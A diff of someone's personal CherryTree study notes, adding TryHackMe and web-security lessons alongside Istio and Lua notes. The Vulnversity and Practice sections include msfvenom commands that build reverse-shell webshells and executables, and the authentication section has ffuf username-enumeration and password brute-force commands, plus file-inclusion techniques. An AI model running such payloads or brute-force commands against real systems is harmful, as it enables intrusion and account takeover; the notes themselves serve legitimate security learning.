@@ -1,7 +1,7 @@
 <?xml version="1.0" encoding="UTF-8"?>
 <cherrytree>
   <bookmarks list=""/>
-  <node name="devops" unique_id="12" prog_lang="custom-colors" tags="" readonly="0" nosearch_me="0" nosearch_ch="0" custom_icon_id="0" is_bold="0" foreground="#1e90ff" ts_creation="1619462339" ts_lastsave="1706379042">
+  <node name="devops" unique_id="12" prog_lang="custom-colors" tags="" readonly="0" nosearch_me="0" nosearch_ch="0" custom_icon_id="0" is_bold="0" foreground="#1e90ff" ts_creation="1619462339" ts_lastsave="1708972397">
     <rich_text>sacar guardapeluzas y limpiarlos
 se separa la ropa en obscura y blanca
 blanca con claros
@@ -7021,8 +7021,16 @@ basic terms
 - shift left approach is devsecops</rich_text>
     </node>
     <node name="Servidores web" unique_id="176" prog_lang="custom-colors" tags="" readonly="0" nosearch_me="0" nosearch_ch="0" custom_icon_id="0" is_bold="0" foreground="" ts_creation="1694987488" ts_lastsave="1694987488"/>
+    <node name="Istio" unique_id="257" prog_lang="custom-colors" tags="" readonly="0" nosearch_me="0" nosearch_ch="0" custom_icon_id="0" is_bold="0" foreground="" ts_creation="1708972397" ts_lastsave="1708973293">
+      <rich_text>get files to execute in minikube , 
+</rich_text>
+      <rich_text link="webs https://github.com/DickChesterwood/istio-fleetman/tree/master/_course_files/x86_amd64">https://github.com/DickChesterwood/istio-fleetman/tree/master/_course_files/x86_amd64</rich_text>
+      <rich_text>
+in warmup, apply the file 1-istio-init.yaml, next 2
+use injection of proxy sidecards</rich_text>
+    </node>
   </node>
-  <node name="TryHackMe" unique_id="149" prog_lang="custom-colors" tags="" readonly="0" nosearch_me="0" nosearch_ch="0" custom_icon_id="0" is_bold="0" foreground="" ts_creation="1685939072" ts_lastsave="1707184432">
+  <node name="TryHackMe" unique_id="149" prog_lang="custom-colors" tags="" readonly="0" nosearch_me="0" nosearch_ch="0" custom_icon_id="0" is_bold="0" foreground="" ts_creation="1685939072" ts_lastsave="1708057899">
     <rich_text>good url:
 
 TO CHECK VULNERABILITIES
@@ -7057,7 +7065,7 @@ TO CHECK VULNERABILITIES
 
 </rich_text>
     <rich_text link="webs https://github.com/postfinance/kubenurse">https://github.com/postfinance/kubenurse</rich_text>
-    <node name="Path Beginer" unique_id="192" prog_lang="custom-colors" tags="" readonly="0" nosearch_me="0" nosearch_ch="0" custom_icon_id="10" is_bold="0" foreground="" ts_creation="1700447328" ts_lastsave="1707540256">
+    <node name="Path Beginer" unique_id="192" prog_lang="custom-colors" tags="" readonly="0" nosearch_me="0" nosearch_ch="0" custom_icon_id="10" is_bold="0" foreground="" ts_creation="1700447328" ts_lastsave="1707761271">
       <node name="Introductory Networking" unique_id="193" prog_lang="custom-colors" tags="" readonly="0" nosearch_me="0" nosearch_ch="0" custom_icon_id="0" is_bold="0" foreground="" ts_creation="1700447369" ts_lastsave="1700527383">
         <rich_text>OSI Model
 - Application
@@ -7724,7 +7732,7 @@ Kernel exploits
 
 scripts: privesc-scripts</rich_text>
       </node>
-      <node name="Vulnversity" unique_id="249" prog_lang="custom-colors" tags="" readonly="0" nosearch_me="0" nosearch_ch="0" custom_icon_id="32" is_bold="0" foreground="" ts_creation="1707540256" ts_lastsave="1707698112">
+      <node name="Vulnversity" unique_id="249" prog_lang="custom-colors" tags="" readonly="0" nosearch_me="0" nosearch_ch="0" custom_icon_id="32" is_bold="0" foreground="" ts_creation="1707540256" ts_lastsave="1707752221">
         <rich_text>Reconnaissance
 - use of nmap to check wheere attack the machine
 - scan: `nmap -sV {ip}`
@@ -7755,7 +7763,268 @@ Locating directories using gobuster
 
 Compromise the webserver
 - use gobuster with-x {extensions}
-- to create webshell using msfvenom: msfvenom -p php/meterpreter/reverse_tcp LHOST=IP LPORT=PORT -f raw -o shell.php</rich_text>
+- to create webshell using msfvenom: msfvenom -p php/meterpreter/reverse_tcp LHOST=IP LPORT=PORT -f raw -o shell.php
+
+Privilege scalation
+- use of SUID files, files with a particular type of permissions
+- files with temporary permissions to execute programs
+- for example use of /usr/bin/passwd
+</rich_text>
+      </node>
+      <node name="Practice" unique_id="250" prog_lang="custom-colors" tags="" readonly="0" nosearch_me="0" nosearch_ch="0" custom_icon_id="27" is_bold="0" foreground="" ts_creation="1707761271" ts_lastsave="1707974692">
+        <rich_text>use of enum4linux to search the user in smb
+smb variety of networking tasks using: nmap -p 445 --script=smb-enum-shares.nse,smb-enum-users.nse {ip}
+to rpcbind: nmap -p 111 --script=nfs-ls,nfs-statfs,nfs-showmount {ip}
+
+in meterpreter use search {cve} to use
+with set {VARIABLE} {VALUE}, to set variables in meterpreter
+to escalate use PowerUp (powershell script)
+
+
+msfvenom -p windows/shell_reverse_tcp LHOST=CONNECTION_IP LPORT=4443 -e x86/shikata_ga_nai -f exe-service -o Advanced.exe
+
+</rich_text>
+        <rich_text link="webs https://www.amazon.com.mx/CUBOT-Celular-5200mah-Android-Negro/dp/B0CFDRC7C6/ref=pd_ci_mcx_mh_mcx_views_0?pd_rd_w=P5064&amp;content-id=amzn1.sym.94874bb0-74e9-4fb8-849c-bd671ff5a5f4%3Aamzn1.symc.40e6a10e-cbc4-4fa5-81e3-4435ff64d03b&amp;pf_rd_p=94874bb0-74e9-4fb8-849c-bd671ff5a5f4&amp;pf_rd_r=E1YH9AHJ2FYMBNBA35CN&amp;pd_rd_wg=DTHpM&amp;pd_rd_r=c498cd89-bbc0-44f0-acb5-b3d109943b0a&amp;pd_rd_i=B0CFDRC7C6">https://www.amazon.com.mx/CUBOT-Celular-5200mah-Android-Negro/dp/B0CFDRC7C6/ref=pd_ci_mcx_mh_mcx_views_0?pd_rd_w=P5064&amp;content-id=amzn1.sym.94874bb0-74e9-4fb8-849c-bd671ff5a5f4%3Aamzn1.symc.40e6a10e-cbc4-4fa5-81e3-4435ff64d03b&amp;pf_rd_p=94874bb0-74e9-4fb8-849c-bd671ff5a5f4&amp;pf_rd_r=E1YH9AHJ2FYMBNBA35CN&amp;pd_rd_wg=DTHpM&amp;pd_rd_r=c498cd89-bbc0-44f0-acb5-b3d109943b0a&amp;pd_rd_i=B0CFDRC7C6</rich_text>
+        <rich_text>
+
+</rich_text>
+      </node>
+    </node>
+    <node name="Web Fundamentals" unique_id="251" prog_lang="custom-colors" tags="" readonly="0" nosearch_me="0" nosearch_ch="0" custom_icon_id="10" is_bold="0" foreground="" ts_creation="1708057899" ts_lastsave="1709224420">
+      <node name="Walking an application" unique_id="252" prog_lang="custom-colors" tags="" readonly="0" nosearch_me="0" nosearch_ch="0" custom_icon_id="152" is_bold="0" foreground="" ts_creation="1708057929" ts_lastsave="1708309278">
+        <rich_text>Introduction
+- manually review a web app for security issues
+- view source
+- inspector
+- debugger
+- network
+
+Exploring the website
+- discover features that could potentially be vulberable and attemp to exploit them
+- explore the website
+
+Viewing the page source
+- page source is the human-readable code
+- code in HTML, CSS and JS
+
+Deeloper Tools - inspector
+- all modern browser includes developer tools.
+- used to web developers in debugging web applications
+- the focus is developer tool kit, inspector, debugger and network
+- click and open inspector to check the code in live mode
+
+Debugger
+- use to debugging JS
+- like pentesters is used to know in deep into the JS code 
+
+Network
+- keep track of every external request a webpage makes</rich_text>
+      </node>
+      <node name="Content Discovery" unique_id="253" prog_lang="custom-colors" tags="" readonly="0" nosearch_me="0" nosearch_ch="0" custom_icon_id="153" is_bold="0" foreground="" ts_creation="1708366529" ts_lastsave="1708536033">
+        <rich_text>What is?
+- file, video, picture, backup, a website feature
+- in content discovery, is not obvious things on a website
+- for example: pages or portals for staff usage, older versions of the web sites, backup files, configuration files, administration panels
+- the three ways: Manually, Automated and OSINT (Open-Source Intelligence)
+
+Robots
+- document that tells search engines which pages they are and aren't allowed to show on their search
+- is common practice to restrict certain website areas
+- like administration portals or file meant for the website
+
+Favicon
+- small icon displayed in the browser's address bar
+- in some website is possible does not change the original favicon and is a clue to know the framework used
+- exists a favicon DB to get name of framework: </rich_text>
+        <rich_text link="webs https://wiki.owasp.org/index.php/OWASP_favicon_database">https://wiki.owasp.org/index.php/OWASP_favicon_database</rich_text>
+        <rich_text>
+
+Sitemap.xml
+- gives a list of every file the website owner wishes to be listed on a search engine
+- contains areas of the website that are a bit mode difficult to navigate
+- in some old websites is where current site no longer uses but are still working behind the scenes
+
+HTTP headers
+- part of response of HTTP Headers.
+- this contains useful information such as the webserver software and possible the programming/scripting languages in use
+- is possible get version of webserver and language version, with this is possible get vulnerabilities
+
+Framework Stack
+- check the version of software to validate vulnerabilities
+
+OSINT - Google Hacking / Dorking
+- external resources available that can help in discovering information about your target
+- OSINT (Open-Source Intelligence)
+- utilizes Google's advanced search engine features
+- pick out results from a certain domain name using the site: filter
+- use example: “site: {site} word_search”
+- words:
+   → site, results only from the specific website
+   → inurl, results that have the specified word in URL
+   → filetype, results which are a partivular file extension
+   → intitle, results that contain the specified word in the title
+
+Wappalyzer
+- online tool and browser extension that helps indentify what technologies a website, such as frameworks, CMS, payment processors and much more
+
+Wayback Machine
+- historical archive of websites that dates back to the late 90s
+- show all the times the service scraped
+- </rich_text>
+        <rich_text link="webs https://archive.org/web/">https://archive.org/web/</rich_text>
+        <rich_text>
+
+Github
+- understand of Git, version control system
+- use of Issues and pull requests
+
+S3
+- storage service provided by Amazon AWS
+- save files, static web sites in the cloud over HTTP
+- is possible configure permissions and sometimes the permissions is bad configured
+- the format is: “https://{name}.s3.amazonaws.com”
+
+Automated discovery
+- Process of use tools to discover content
+- use of hundred, thousands or even millions of request to web server
+- request to check file or directory using wordlists
+- wordlist is a long list of commonly used words
+- use of:
+   → ffuf: ffuf -w {wordlist} -u {ip}/FUZZ
+   → dirb: dirb {ip} {wordlist}
+   → gobuster: gobuster dir --url {ip} -w {wordlist}</rich_text>
+      </node>
+      <node name="Subdomain Enumeration" unique_id="255" prog_lang="custom-colors" tags="" readonly="0" nosearch_me="0" nosearch_ch="0" custom_icon_id="154" is_bold="0" foreground="" ts_creation="1708619573" ts_lastsave="1708621146">
+        <rich_text>Brief
+- process of finding valid subdomains for a domain
+- three different enumeration methods: Brute Force, OSINT and Virtual Host
+
+OSINT - SSL/TLS Certificates
+- this is created by a Certificate Authority
+- there are publicly accessible logs of SSL/TLS certificate created for a domain name
+- the objetives is stop malicious and accidentally made certificates from being used
+- sites like: </rich_text>
+        <rich_text link="webs https://crt.sh">https://crt.sh</rich_text>
+        <rich_text> and </rich_text>
+        <rich_text link="webs https://ui.ctsearch.entrust.com/ui/ctsearchui">https://ui.ctsearch.entrust.com/ui/ctsearchui</rich_text>
+        <rich_text>
+
+Search Engines
+- contain trillions of links to more than a billion websites, used to find new subdomains
+- use of advanced search methods on websites like `site: filter`
+- example: -site </rich_text>
+        <rich_text link="webs http://www.domain.com">www.domain.com</rich_text>
+        <rich_text> site: *.domain.com
+
+DNS bruteforce
+- method of trying tens, hundreds, thousands or even millions of different possible subdomains from a pre-defined list of commonly used subdomains
+
+Sublist3r
+- use of tools like sublist3r
+
+Virtual host
+- aren't always hosted in publically accesible DNS results
+- web servers can host multiple websites from one server when a website is requested from a client
+- discover subdomains: ffuf -w {wordlist} -H "{header}" -u {ip}</rich_text>
+      </node>
+      <node name="Authentication Bypass" unique_id="256" prog_lang="custom-colors" tags="" readonly="0" nosearch_me="0" nosearch_ch="0" custom_icon_id="152" is_bold="0" foreground="" ts_creation="1708715590" ts_lastsave="1708979402">
+        <rich_text>Brief
+- ways to website authentication can be bypassed, defeated or broken
+
+Username Enumeration
+- creation of list of calid usernames
+- check: ffuf -w /usr/share/wordlists/SecLists/Usernames/Names/names.txt -X POST -d "username=FUZZ&amp;email=x&amp;password=x&amp;cpassword=x" -H "Content-Type: application/x-www-form-urlencoded" -u http://10.10.119.189/customers/signup -mr "username already exists"
+
+Brute Force
+- automated process that tries a list of commonly used passwords againts either a single username
+- check: ffuf -w valid_usernames.txt:W1,/usr/share/wordlists/SecLists/Passwords/Common-Credentials/10-million-password-list-top-100.txt:W2 -X POST -d "username=W1&amp;password=W2" -H "Content-Type: application/x-www-form-urlencoded" -u http://10.10.119.189/customers/login -fc 200
+
+Logic Flaw
+- sometimes auth processes contain logic flaws
+- logical path of an app is either bypassed, circumvented or manipulated bu a hacker
+- for example check if page contain /admin
+
+Cookie tampering
+- using cookies to set session is possible get unauthenticated access, access to another user's account or elevated privileges
+- plain text, som cookies can be in plain text and is obvious what they do
+- Hashing, some cookies can look like a long string of random chars, this is irreversible representation
+- encoding, is similar to hashing, this create a random string, but this is reversible, this only support ASCII chars</rich_text>
+      </node>
+      <node name="IDOR" unique_id="258" prog_lang="custom-colors" tags="" readonly="0" nosearch_me="0" nosearch_ch="0" custom_icon_id="153" is_bold="0" foreground="" ts_creation="1709059626" ts_lastsave="1709086585">
+        <rich_text>What is?
+- Insecure Direct Object Reference
+- type of access control vulnerability
+- can occur when a ws receives user-supplied input to retrieve objects (files, data, documents)
+- this is not validate on the server side
+
+Example
+- access using for example id of object in WS
+
+Finding IDORs in Encoded IDs
+- data from post, query strings or cookies the developers take the raw data and encode it
+- the server will be able to understan the contents
+- encoding binary data into a ASCII string commonly using [a-zA-Z0-9=]
+- the most common is base64
+
+Finding IDORs in Hashed IDs
+- little bot more complicated to deal with than encodede ones
+- follow a predictable pattern
+- use of md5 hashing
+
+Unpreditable IDs
+- creation of 2 accounts and swap the id number between them
+- if is possible see the information of another users this is an IDOR
+
+Where are IDORs located
+- not always in the address bar
+- it could be content in AJAX request or some file of JS
+- some values is in parameters</rich_text>
+      </node>
+      <node name="File Inclusion" unique_id="259" prog_lang="custom-colors" tags="" readonly="0" nosearch_me="0" nosearch_ch="0" custom_icon_id="154" is_bold="0" foreground="" ts_creation="1709224420" ts_lastsave="1709955991">
+        <rich_text>Introduction
+- exploit of inclusion vulnerabilities
+- local file inclusion (LFI), remote File Inclusion (RFI) and directory traversal
+- is possible access to files in a web applications, including images, static text and so on via parameters
+- why happen?, in PHP that are poorly written and implemented, the main is the input validation, which the user inputs are not sanitized or validated
+- risk-- vulnerabilities to leak data, such as code, credentials or other important files
+
+Path Traversal
+- known as Directory traversal, attacker read operating system resources, such as local files on the server running an app
+- Is possible by access of files or directories stored outside the apps root directory
+- occurs when user's input is passed to a function such as file_get_contents in PHP
+- the function is not the main contributor to the vulnerability
+- poor input validation or filtering is the cause of the vulnerability
+- is possible test the url with ../ (do-dot-slash attack), to access another files
+- if the app runs in windows is necesary use windows path
+
+Local File Inclusion
+- attacks again web apps, where is lack of security awareness
+- in PHP using functions as include, require, include_one and require_one
+- is possible get in other languages like ASP, JSP or even in Nodejs
+- use of null bytes is an injection technique where URL-encoded representattion such as %00 or 0x00, uso to block for example the check extension of include in php
+- this not work from php =&gt; 5.3.4 
+- use of {path}/. to access the file
+- anoher is using ....// regex to remove innecesaries commands in path
+- in some cases is necesario execute by path and add file for example {ip}/{path}../../{file}
+
+Remote File Inclusion
+- technique to include remote files and into a vunerable app
+- occuers when improperly sanitizing user input
+- used to inject an external URL into include, is necesary that allow_url_fopen option in on
+- this is higher than LFI, because attackeet gain remote command execution this include:
+   → sensitive information disclosure
+   → cross-site scripting
+   → denial of services
+- RFI steps: injects the malicious URL, if input not contains valdation, the url passes into the include function, the servers send a GET request to the maliciius server to fetch the file, finally the app includes the remote file into include function to execute the PHP file
+
+Remedetion
+- update to lastest version
+- turn off php errors
+- use of WAF
+- disable php features that cause file inclusion 
+- analyze the web application and allow only protocol and PHP wrappers
+- Never trust user input
+- implement whitelisting for file names and locations</rich_text>
       </node>
     </node>
     <node name="Pyramid of pain" unique_id="150" prog_lang="custom-colors" tags="" readonly="0" nosearch_me="0" nosearch_ch="0" custom_icon_id="0" is_bold="0" foreground="" ts_creation="1685939081" ts_lastsave="1685940575">
@@ -16468,7 +16737,7 @@ Tipos de funciones
 - </rich_text>
     </node>
   </node>
-  <node name="Nuevos lenguajes" unique_id="40" prog_lang="custom-colors" tags="" readonly="0" nosearch_me="0" nosearch_ch="0" custom_icon_id="0" is_bold="0" foreground="" ts_creation="1617842349" ts_lastsave="1698688730">
+  <node name="Nuevos lenguajes" unique_id="40" prog_lang="custom-colors" tags="" readonly="0" nosearch_me="0" nosearch_ch="0" custom_icon_id="0" is_bold="0" foreground="" ts_creation="1617842349" ts_lastsave="1708538520">
     <node name="Algoritmos y pensamiento logico" unique_id="41" prog_lang="custom-colors" tags="" readonly="0" nosearch_me="0" nosearch_ch="0" custom_icon_id="0" is_bold="0" foreground="" ts_creation="1617842365" ts_lastsave="1641884633">
       <rich_text>en python con () se hace un generator expresion que es como una lista pero mas potente, ocupa menos memoria
 
@@ -17416,6 +17685,53 @@ estados de hilos:
       <rich_text>
 </rich_text>
       <rich_text scale="h3" foreground="#eff3f8">Qué lenguaje introdujo el concepto de "código intermedio"?</rich_text>
+    </node>
+    <node name="Lua" unique_id="254" prog_lang="custom-colors" tags="" readonly="0" nosearch_me="0" nosearch_ch="0" custom_icon_id="0" is_bold="0" foreground="" ts_creation="1708538520" ts_lastsave="1708970331">
+      <rich_text>Lexical Conventios
+- not beging with numbers, string of letters, digits and underscores
+- with _{uppercase} is reserved to special cases
+- _ used to anonymous variables
+- comments start with --
+- large comments is used --[[ comment ]]
+
+Types and values
+- dynamically-typed
+- weak-typed
+- basic types: nil, boolean, number, string, userdata, function, thread and table
+- x = x or v == if not x then x = v end
+- a and b or c, this is ternary operator
+- 0 is a special case, ex: not 0 == false, any number is true
+
+Input and Output
+- read with io.read()
+- write: print or io.write()
+
+Tables
+- fundamental and powerful data structure in Lua
+- represent arrays, dictionaries, set and more
+- not only acces numbers as indices, not nil
+- this is a objects
+- construct with: t = {}
+- with #t, get the size
+- structures is tables
+- is possible use with dot to get values by index
+- with float values this is converted to int
+- the most basic constructor is using {}
+- is possible set values in {}
+- exists local and global variables
+- is possible mix multiple tables
+- if a table is register without keys is used the number index
+- for appends is used: a[#a + 1] = p
+
+Functions
+- code that performs a specific task or operation'
+- use to specific task or compute and return values
+- this is a first-class citizen, asigned to variables, passed as arguement, stored in table and treated like any other data type
+- with one argument, the parentesis is optional
+- definition is with function {name} ({argument}) {body} end
+- is possible return multiple values like a tuple
+- variadic fucntions, variable number of parameters, using (...), to use multiple variables
+- ipairs returns two values, the index and the value</rich_text>
     </node>
   </node>
   <node name="Crecimiento personal" unique_id="45" prog_lang="custom-colors" tags="" readonly="0" nosearch_me="0" nosearch_ch="0" custom_icon_id="0" is_bold="0" foreground="" ts_creation="1617947184" ts_lastsave="1684703124">
